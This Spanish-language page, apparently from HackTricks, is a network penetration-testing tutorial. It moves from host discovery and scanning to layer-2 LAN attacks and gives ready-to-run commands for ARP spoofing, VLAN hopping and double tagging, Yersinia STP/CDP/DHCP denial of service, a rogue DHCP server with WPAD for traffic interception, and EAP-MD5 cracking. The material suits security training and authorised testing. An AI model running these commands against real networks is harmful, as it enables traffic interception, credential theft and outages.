# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Descubriendo hosts desde el exterior

Esta va a ser una **sección breve** sobre cómo encontrar **IPs que responden** desde el **Internet**.\
En esta situación tienes un **rango de IPs** (quizás incluso varios **rangos**) y solo necesitas encontrar **qué IPs están respondiendo**.

### ICMP

Esta es la forma **más fácil** y **rápida** de descubrir si un host está activo o no.\
Puedes intentar enviar algunos paquetes de **ICMP** y **esperar respuestas**. La forma más sencilla es simplemente enviar una **solicitud de eco** y esperar la respuesta. Puedes hacer eso usando un simple `ping` o usando `fping` para **rangos**.\
También podrías usar **nmap** para enviar otros tipos de paquetes ICMP (esto evitará filtros a la solicitud-respuesta de eco ICMP común).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descubrimiento de Puertos TCP

Es muy común encontrar que todo tipo de paquetes ICMP están siendo filtrados. Entonces, lo único que puedes hacer para verificar si un host está activo es **intentar encontrar puertos abiertos**. Cada host tiene **65535 puertos**, así que, si tienes un alcance "grande", **no puedes** probar si **cada puerto** de cada host está abierto o no, eso tomaría demasiado tiempo.\
Entonces, lo que necesitas es un **escáner de puertos rápido** ([masscan](https://github.com/robertdavidgraham/masscan)) y una lista de los **puertos más utilizados:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
También podrías realizar este paso con `nmap`, pero es más lento y `nmap` tiene problemas para identificar hosts activos.

### Descubrimiento de Puertos HTTP

Esto es solo un descubrimiento de puertos TCP útil cuando deseas **enfocarte en descubrir servicios HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descubrimiento de Puertos UDP

También podrías intentar verificar si hay algún **puerto UDP abierto** para decidir si deberías **prestar más atención** a un **host.** Dado que los servicios UDP generalmente **no responden** con **datos** a un paquete de sondeo UDP vacío, es difícil decir si un puerto está siendo filtrado o abierto. La forma más fácil de decidir esto es enviar un paquete relacionado con el servicio en ejecución, y como no sabes qué servicio está en funcionamiento, deberías probar el más probable según el número de puerto:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La línea de nmap propuesta anteriormente probará los **1000 puertos UDP principales** en cada host dentro del rango **/24**, pero incluso solo esto tomará **>20min**. Si necesitas **resultados más rápidos**, puedes usar [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Esto enviará estas **probes UDP** a su **puerto esperado** (para un rango /24 esto solo tomará 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descubrimiento de Puertos SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aquí puedes encontrar una buena guía de todos los ataques Wifi bien conocidos en el momento de la escritura:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Descubriendo hosts desde adentro

Si estás dentro de la red, una de las primeras cosas que querrás hacer es **descubrir otros hosts**. Dependiendo de **cuánto ruido** puedas/quieras hacer, se podrían realizar diferentes acciones:

### Pasivo

Puedes usar estas herramientas para descubrir pasivamente hosts dentro de una red conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Activo

Note que las técnicas comentadas en [_**Descubriendo hosts desde afuera**_](#discovering-hosts-from-the-outside) (_Descubrimiento de puertos TCP/HTTP/UDP/SCTP_) también pueden ser **aplicadas aquí**.\
Pero, como estás en la **misma red** que los otros hosts, puedes hacer **más cosas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Note que las técnicas comentadas en _Descubriendo hosts desde el exterior_ ([_**ICMP**_](#icmp)) también pueden ser **aplicadas aquí**.\
Pero, como estás en la **misma red** que los otros hosts, puedes hacer **más cosas**:

- Si **haces ping** a una **dirección de difusión de subred**, el ping debería llegar a **cada host** y podrían **responder** a **ti**: `ping -b 10.10.5.255`
- Haciendo ping a la **dirección de difusión de la red** podrías incluso encontrar hosts dentro de **otras subredes**: `ping -b 255.255.255.255`
- Usa las flags `-PE`, `-PP`, `-PM` de `nmap` para realizar el descubrimiento de hosts enviando respectivamente **ICMPv4 echo**, **timestamp**, y **solicitudes de máscara de subred:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan se utiliza para **encender** computadoras a través de un **mensaje de red**. El paquete mágico utilizado para encender la computadora es solo un paquete donde se proporciona un **MAC Dst** y luego se **repite 16 veces** dentro del mismo paquete.\
Luego, este tipo de paquetes generalmente se envían en un **ethernet 0x0842** o en un **paquete UDP al puerto 9**.\
Si **no se proporciona \[MAC]**, el paquete se envía a **difusión ethernet** (y el MAC de difusión será el que se repita).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneo de Hosts

Una vez que hayas descubierto todas las IPs (externas o internas) que deseas escanear en profundidad, se pueden realizar diferentes acciones.

### TCP

- **Puerto** abierto: _SYN --> SYN/ACK --> RST_
- **Puerto** cerrado: _SYN --> RST/ACK_
- **Puerto** filtrado: _SYN --> \[SIN RESPUESTA]_
- **Puerto** filtrado: _SYN --> mensaje ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Hay 2 opciones para escanear un puerto UDP:

- Enviar un **paquete UDP** y verificar la respuesta _**ICMP unreachable**_ si el puerto está **cerrado** (en varios casos, ICMP será **filtrado**, por lo que no recibirás ninguna información si el puerto está cerrado o abierto).
- Enviar **datagramas formateados** para provocar una respuesta de un **servicio** (por ejemplo, DNS, DHCP, TFTP y otros, como se enumera en _nmap-payloads_). Si recibes una **respuesta**, entonces, el puerto está **abierto**.

**Nmap** **mezclará ambas** opciones usando "-sV" (los escaneos UDP son muy lentos), pero ten en cuenta que los escaneos UDP son más lentos que los escaneos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Escaneo SCTP

**SCTP (Stream Control Transmission Protocol)** está diseñado para ser utilizado junto con **TCP (Transmission Control Protocol)** y **UDP (User Datagram Protocol)**. Su principal propósito es facilitar el transporte de datos de telefonía a través de redes IP, reflejando muchas de las características de fiabilidad que se encuentran en **Signaling System 7 (SS7)**. **SCTP** es un componente central de la familia de protocolos **SIGTRAN**, que tiene como objetivo transportar señales SS7 a través de redes IP.

El soporte para **SCTP** es proporcionado por varios sistemas operativos, como **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** y **VxWorks**, lo que indica su amplia aceptación y utilidad en el campo de las telecomunicaciones y redes.

Se ofrecen dos escaneos diferentes para SCTP por nmap: _-sY_ y _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasión de IDS e IPS

{{#ref}}
ids-evasion.md
{{#endref}}

### **Más opciones de nmap**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Revelando direcciones IP internas

**Los enrutadores, cortafuegos y dispositivos de red mal configurados** a veces responden a sondas de red utilizando **direcciones de origen no públicas**. **tcpdump** se puede utilizar para identificar paquetes recibidos de direcciones privadas durante las pruebas. Específicamente, en Kali Linux, se pueden capturar paquetes en la **interfaz eth2**, que es accesible desde Internet público. Es importante tener en cuenta que si tu configuración está detrás de un NAT o un cortafuegos, es probable que dichos paquetes sean filtrados.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Con el sniffing puedes aprender detalles de rangos IP, tamaños de subred, direcciones MAC y nombres de host revisando tramas y paquetes capturados. Si la red está mal configurada o la infraestructura de conmutación está bajo estrés, los atacantes pueden capturar material sensible a través del sniffing pasivo de red.

Si una red Ethernet conmutada está configurada correctamente, solo verás tramas de difusión y material destinado a tu dirección MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
También se pueden capturar paquetes de una máquina remota a través de una sesión SSH con Wireshark como la GUI en tiempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciales

Puedes usar herramientas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analizar credenciales de un pcap o de una interfaz en vivo.

## Ataques LAN

### Suplantación ARP

La suplantación ARP consiste en enviar ARPResponses gratuitos para indicar que la IP de una máquina tiene la MAC de nuestro dispositivo. Luego, la víctima cambiará la tabla ARP y contactará nuestra máquina cada vez que quiera contactar la IP suplantada.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Desbordamiento de CAM

Desbordar la tabla CAM del switch enviando muchos paquetes con diferentes direcciones MAC de origen. Cuando la tabla CAM está llena, el switch comienza a comportarse como un hub (broadcasting todo el tráfico).
```bash
macof -i <interface>
```
En los switches modernos, esta vulnerabilidad ha sido corregida.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

El **Dynamic Trunking Protocol (DTP)** está diseñado como un protocolo de capa de enlace para facilitar un sistema automático de trunking, permitiendo que los switches seleccionen automáticamente puertos para el modo trunk (Trunk) o modo no trunk. La implementación de **DTP** a menudo se considera indicativa de un diseño de red subóptimo, subrayando la importancia de configurar manualmente los trunks solo donde sea necesario y asegurando una documentación adecuada.

Por defecto, los puertos de los switches están configurados para operar en modo Dynamic Auto, lo que significa que están listos para iniciar el trunking si son solicitados por un switch vecino. Surge una preocupación de seguridad cuando un pentester o atacante se conecta al switch y envía un marco DTP Desirable, obligando al puerto a entrar en modo trunk. Esta acción permite al atacante enumerar VLANs a través del análisis de marcos STP y eludir la segmentación de VLAN al configurar interfaces virtuales.

La presencia de DTP en muchos switches por defecto puede ser explotada por adversarios para imitar el comportamiento de un switch, obteniendo así acceso al tráfico a través de todas las VLANs. El script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se utiliza para monitorear una interfaz, revelando si un switch está en modo Default, Trunk, Dynamic, Auto o Access—siendo este último la única configuración inmune a ataques de VLAN hopping. Esta herramienta evalúa el estado de vulnerabilidad del switch.

Si se identifica una vulnerabilidad en la red, se puede emplear la herramienta _**Yersinia**_ para "habilitar el trunking" a través del protocolo DTP, permitiendo la observación de paquetes de todas las VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Para enumerar las VLANs, también es posible generar el marco DTP Desirable con el script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. No interrumpa el script bajo ninguna circunstancia. Inyecta DTP Desirable cada tres segundos. **Los canales de trunk creados dinámicamente en el switch solo viven durante cinco minutos. Después de cinco minutos, el trunk se desconecta.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Quisiera señalar que **Access/Desirable (0x03)** indica que el marco DTP es del tipo Desirable, lo que le dice al puerto que cambie al modo Trunk. Y **802.1Q/802.1Q (0xa5)** indica el tipo de encapsulación **802.1Q**.

Al analizar los marcos STP, **aprendemos sobre la existencia de VLAN 30 y VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs específicas

Una vez que conozcas los IDs de VLAN y los valores de IP, puedes **configurar una interfaz virtual para atacar una VLAN específica**.\
Si DHCP no está disponible, utiliza _ifconfig_ para establecer una dirección IP estática.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

El ataque discutido de **Dynamic Trunking y la creación de interfaces virtuales para descubrir hosts dentro** de otras VLANs se **realiza automáticamente** con la herramienta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Si un atacante conoce el valor del **MAC, IP y VLAN ID del host víctima**, podría intentar **doble etiquetar un marco** con su VLAN designada y la VLAN de la víctima y enviar un paquete. Como la **víctima no podrá conectarse de vuelta** con el atacante, la **mejor opción para el atacante es comunicarse a través de UDP** a protocolos que pueden realizar algunas acciones interesantes (como SNMP).

Otra opción para el atacante es lanzar un **escaneo de puertos TCP suplantando una IP controlada por el atacante y accesible por la víctima** (probablemente a través de internet). Luego, el atacante podría espiar en el segundo host de su propiedad si recibe algunos paquetes de la víctima.

![](<../../images/image (190).png>)

Para realizar este ataque, podrías usar scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass de Segmentación Lateral de VLAN <a href="#d679" id="d679"></a>

Si tienes **acceso a un switch al que estás conectado directamente**, tienes la capacidad de **eludir la segmentación de VLAN** dentro de la red. Simplemente **cambia el puerto a modo trunk** (también conocido como trunk), crea interfaces virtuales con los IDs de las VLANs objetivo y configura una dirección IP. Puedes intentar solicitar la dirección dinámicamente (DHCP) o puedes configurarla estáticamente. Depende del caso.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Bypass de VLAN Privada de Capa 3

En ciertos entornos, como redes inalámbricas para invitados, se implementan configuraciones de **aislamiento de puertos (también conocido como VLAN privada)** para evitar que los clientes conectados a un punto de acceso inalámbrico se comuniquen directamente entre sí. Sin embargo, se ha identificado una técnica que puede eludir estas medidas de aislamiento. Esta técnica explota la falta de ACLs de red o su configuración incorrecta, permitiendo que los paquetes IP sean enrutados a través de un router para alcanzar a otro cliente en la misma red.

El ataque se ejecuta creando un **paquete que lleva la dirección IP del cliente de destino pero con la dirección MAC del router**. Esto provoca que el router reenvíe erróneamente el paquete al cliente objetivo. Este enfoque es similar al utilizado en Ataques de Doble Etiquetado, donde se utiliza la capacidad de controlar un host accesible para la víctima para explotar la vulnerabilidad de seguridad.

**Pasos Clave del Ataque:**

1. **Creación de un Paquete:** Se crea un paquete especialmente para incluir la dirección IP del cliente objetivo pero con la dirección MAC del router.
2. **Explotación del Comportamiento del Router:** El paquete creado se envía al router, que, debido a la configuración, redirige el paquete al cliente objetivo, eludiendo el aislamiento proporcionado por las configuraciones de VLAN privada.

### Ataques VTP

VTP (Protocolo de Trunking de VLAN) centraliza la gestión de VLAN. Utiliza números de revisión para mantener la integridad de la base de datos de VLAN; cualquier modificación incrementa este número. Los switches adoptan configuraciones con números de revisión más altos, actualizando sus propias bases de datos de VLAN.

#### Roles del Dominio VTP

- **Servidor VTP:** Gestiona VLANs—crea, elimina, modifica. Transmite anuncios de VTP a los miembros del dominio.
- **Cliente VTP:** Recibe anuncios de VTP para sincronizar su base de datos de VLAN. Este rol está restringido de modificaciones locales de configuración de VLAN.
- **Transparente VTP:** No participa en actualizaciones de VTP pero reenvía anuncios de VTP. No se ve afectado por ataques de VTP, mantiene un número de revisión constante de cero.

#### Tipos de Anuncios VTP

- **Anuncio Resumen:** Transmitido por el servidor VTP cada 300 segundos, llevando información esencial del dominio.
- **Anuncio de Subconjunto:** Enviado tras cambios en la configuración de VLAN.
- **Solicitud de Anuncio:** Emitida por un cliente VTP para solicitar un Anuncio Resumen, típicamente en respuesta a la detección de un número de revisión de configuración más alto.

Las vulnerabilidades de VTP son explotables exclusivamente a través de puertos trunk, ya que los anuncios de VTP circulan únicamente a través de ellos. Los escenarios posteriores a un ataque DTP pueden pivotar hacia VTP. Herramientas como Yersinia pueden facilitar ataques VTP, con el objetivo de eliminar la base de datos de VLAN, interrumpiendo efectivamente la red.

Nota: Esta discusión se refiere a la versión 1 de VTP (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
En el modo gráfico de Yersinia, elige la opción de eliminar todos los VTP vlans para purgar la base de datos de VLAN.

### Ataques STP

**Si no puedes capturar tramas BPDU en tus interfaces, es poco probable que tengas éxito en un ataque STP.**

#### **STP BPDU DoS**

Enviando muchos BPDUs TCP (Notificación de Cambio de Topología) o Conf (los BPDUs que se envían cuando se crea la topología), los switches se sobrecargan y dejan de funcionar correctamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Ataque STP TCP**

Cuando se envía un TCP, la tabla CAM de los switches se eliminará en 15s. Luego, si estás enviando continuamente este tipo de paquetes, la tabla CAM se reiniciará continuamente (o cada 15 segundos) y cuando se reinicie, el switch se comporta como un hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Ataque STP Root**

El atacante simula el comportamiento de un switch para convertirse en el root STP de la red. Luego, más datos pasarán a través de él. Esto es interesante cuando estás conectado a dos switches diferentes.\
Esto se hace enviando paquetes BPDUs CONF que dicen que el valor de **prioridad** es menor que la prioridad actual del switch root real.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si el atacante está conectado a 2 switches, puede ser la raíz del nuevo árbol y todo el tráfico entre esos switches pasará a través de él** (se realizará un ataque MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

CISCO Discovery Protocol (CDP) es esencial para la comunicación entre dispositivos CISCO, permitiéndoles **identificarse entre sí y compartir detalles de configuración**.

#### Recolección de Datos Pasiva <a href="#id-0e0f" id="id-0e0f"></a>

CDP está configurado para transmitir información a través de todos los puertos, lo que podría llevar a un riesgo de seguridad. Un atacante, al conectarse a un puerto de switch, podría desplegar sniffers de red como **Wireshark**, **tcpdump** o **Yersinia**. Esta acción puede revelar datos sensibles sobre el dispositivo de red, incluyendo su modelo y la versión de Cisco IOS que ejecuta. El atacante podría entonces apuntar a vulnerabilidades específicas en la versión de Cisco IOS identificada.

#### Induciendo la Inundación de la Tabla CDP <a href="#id-0d6a" id="id-0d6a"></a>

Un enfoque más agresivo implica lanzar un ataque de Denegación de Servicio (DoS) al abrumar la memoria del switch, pretendiendo ser dispositivos CISCO legítimos. A continuación se muestra la secuencia de comandos para iniciar tal ataque utilizando Yersinia, una herramienta de red diseñada para pruebas:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante este ataque, la CPU del switch y la tabla de vecinos CDP están muy sobrecargadas, lo que lleva a lo que a menudo se denomina **“parálisis de red”** debido al consumo excesivo de recursos.

#### Ataque de suplantación CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
También podrías usar [**scapy**](https://github.com/secdev/scapy/). Asegúrate de instalarlo con el paquete `scapy/contrib`.

### Ataques VoIP y la herramienta VoIP Hopper

Los teléfonos VoIP, cada vez más integrados con dispositivos IoT, ofrecen funcionalidades como desbloquear puertas o controlar termostatos a través de números de teléfono especiales. Sin embargo, esta integración puede presentar riesgos de seguridad.

La herramienta [**voiphopper**](http://voiphopper.sourceforge.net) está diseñada para emular un teléfono VoIP en varios entornos (Cisco, Avaya, Nortel, Alcatel-Lucent). Descubre el ID de VLAN de la red de voz utilizando protocolos como CDP, DHCP, LLDP-MED y 802.1Q ARP.

**VoIP Hopper** ofrece tres modos para el Protocolo de Descubrimiento de Cisco (CDP):

1. **Modo Sniff** (`-c 0`): Analiza paquetes de red para identificar el ID de VLAN.
2. **Modo Spoof** (`-c 1`): Genera paquetes personalizados que imitan los de un dispositivo VoIP real.
3. **Modo Spoof con Paquete Pre-hecho** (`-c 2`): Envía paquetes idénticos a los de un modelo específico de teléfono IP Cisco.

El modo preferido por velocidad es el tercero. Requiere especificar:

- La interfaz de red del atacante (`-i` parámetro).
- El nombre del dispositivo VoIP que se está emulando (`-E` parámetro), siguiendo el formato de nomenclatura de Cisco (por ejemplo, SEP seguido de una dirección MAC).

En entornos corporativos, para imitar un dispositivo VoIP existente, uno podría:

- Inspeccionar la etiqueta MAC en el teléfono.
- Navegar por la configuración de pantalla del teléfono para ver la información del modelo.
- Conectar el dispositivo VoIP a una laptop y observar las solicitudes CDP usando Wireshark.

Un comando de ejemplo para ejecutar la herramienta en el tercer modo sería:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataques DHCP

#### Enumeración
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Se pueden realizar dos tipos de DoS** contra servidores DHCP. El primero consiste en **simular suficientes hosts falsos para utilizar todas las direcciones IP posibles**.\
Este ataque funcionará solo si puedes ver las respuestas del servidor DHCP y completar el protocolo (**Discover** (Comp) --> **Offer** (servidor) --> **Request** (Comp) --> **ACK** (servidor)). Por ejemplo, esto **no es posible en redes Wifi**.

Otra forma de realizar un DoS de DHCP es enviar un **paquete DHCP-RELEASE utilizando como código fuente cada IP posible**. Entonces, el servidor pensará que todos han terminado de usar la IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Una forma más automática de hacer esto es utilizando la herramienta [DHCPing](https://github.com/kamorin/DHCPig)

Podrías usar los ataques de DoS mencionados para forzar a los clientes a obtener nuevos arrendamientos dentro del entorno y agotar los servidores legítimos para que se vuelvan inoperantes. Así que cuando los legítimos intenten reconectarse, **puedes servir valores maliciosos mencionados en el siguiente ataque**.

#### Establecer valores maliciosos

Se puede configurar un servidor DHCP malicioso utilizando el script DHCP ubicado en `/usr/share/responder/DHCP.py`. Esto es útil para ataques en la red, como capturar tráfico HTTP y credenciales, redirigiendo el tráfico a un servidor malicioso. Sin embargo, establecer una puerta de enlace maliciosa es menos efectivo ya que solo permite capturar tráfico saliente del cliente, perdiendo las respuestas de la puerta de enlace real. En su lugar, se recomienda configurar un servidor DNS o WPAD malicioso para un ataque más efectivo.

A continuación se presentan las opciones de comando para configurar el servidor DHCP malicioso:

- **Nuestra dirección IP (Anuncio de puerta de enlace)**: Usa `-i 10.0.0.100` para anunciar la IP de tu máquina como la puerta de enlace.
- **Nombre de dominio DNS local**: Opcionalmente, usa `-d example.org` para establecer un nombre de dominio DNS local.
- **IP del router/puerta de enlace original**: Usa `-r 10.0.0.1` para especificar la dirección IP del router o puerta de enlace legítima.
- **IP del servidor DNS primario**: Usa `-p 10.0.0.100` para establecer la dirección IP del servidor DNS malicioso que controlas.
- **IP del servidor DNS secundario**: Opcionalmente, usa `-s 10.0.0.1` para establecer una IP de servidor DNS secundario.
- **Máscara de red de la red local**: Usa `-n 255.255.255.0` para definir la máscara de red para la red local.
- **Interfaz para tráfico DHCP**: Usa `-I eth1` para escuchar el tráfico DHCP en una interfaz de red específica.
- **Dirección de configuración WPAD**: Usa `-w “http://10.0.0.100/wpad.dat”` para establecer la dirección para la configuración WPAD, ayudando en la interceptación del tráfico web.
- **Suplantar la IP de la puerta de enlace predeterminada**: Incluye `-S` para suplantar la dirección IP de la puerta de enlace predeterminada.
- **Responder a todas las solicitudes DHCP**: Incluye `-R` para hacer que el servidor responda a todas las solicitudes DHCP, pero ten en cuenta que esto es ruidoso y puede ser detectado.

Al usar correctamente estas opciones, se puede establecer un servidor DHCP malicioso para interceptar el tráfico de red de manera efectiva.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataques EAP**

Aquí hay algunas de las tácticas de ataque que se pueden utilizar contra implementaciones de 802.1X:

- Fuerza bruta activa de contraseñas a través de EAP
- Ataque al servidor RADIUS con contenido EAP malformado _\*\*_(exploits)
- Captura de mensajes EAP y cracking de contraseñas offline (EAP-MD5 y PEAP)
- Forzar la autenticación EAP-MD5 para eludir la validación del certificado TLS
- Inyectar tráfico de red malicioso al autenticar usando un hub o similar

Si el atacante está entre la víctima y el servidor de autenticación, podría intentar degradar (si es necesario) el protocolo de autenticación a EAP-MD5 y capturar el intento de autenticación. Luego, podría realizar fuerza bruta utilizando:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

